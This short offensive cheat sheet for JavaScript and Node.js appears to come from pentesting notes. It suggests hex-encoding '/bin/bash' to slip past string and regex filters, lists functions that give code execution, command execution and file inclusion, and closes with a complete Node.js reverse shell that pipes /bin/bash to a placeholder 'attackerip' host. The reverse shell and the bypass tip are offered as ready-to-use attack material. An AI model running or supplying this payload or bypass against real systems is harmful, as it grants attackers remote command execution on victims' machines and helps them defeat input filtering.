# JavaScript

### Notes
- JavaScript strings can be natively hex-encoded e.g. `"\\\\x2fbin\\\\x2fbash"` - useful for string/regex bypass

### Dangerous Functions

```js
/* RCE */
eval()                  //evaluate string as a javascript code
safe-eval()             //same as eval, but more secure.
setTimeout(string, 2)
setInterval(string)
Function(string)

/* Command Execution */
child_process.exec()

/* LFI */
require()
```

### Reverse Shell

```js
var net = require("net"), sh = require("child_process").exec("/bin/bash");
var client = new net.Socket();
client.connect(80, "attackerip", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);
sh.stderr.pipe(client);});
```
